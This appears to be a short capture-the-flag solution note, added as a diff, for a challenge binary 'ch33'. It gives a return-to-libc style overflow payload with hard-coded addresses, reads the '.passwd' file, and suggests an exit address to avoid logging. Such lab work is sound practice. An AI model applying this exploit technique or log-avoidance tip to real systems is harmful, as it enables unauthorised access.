@@ -1,0 +1,8 @@
+$ ./ch33 `python -c 'print "AAAAAAAABBBCCCCCDDDDDEEEEEEEEEEE\x10\x83\xe6\xb7\xef\xbe\xad\xde\x4c\xad\xf8\xb7"'`
+	$ cat .passwd
+
+Interresting point.
+
+0xdeadbeef -> ret addressed poped and jumped into after system returns.
+Use exit syscall address if you want a clean exit and no logging info?
+
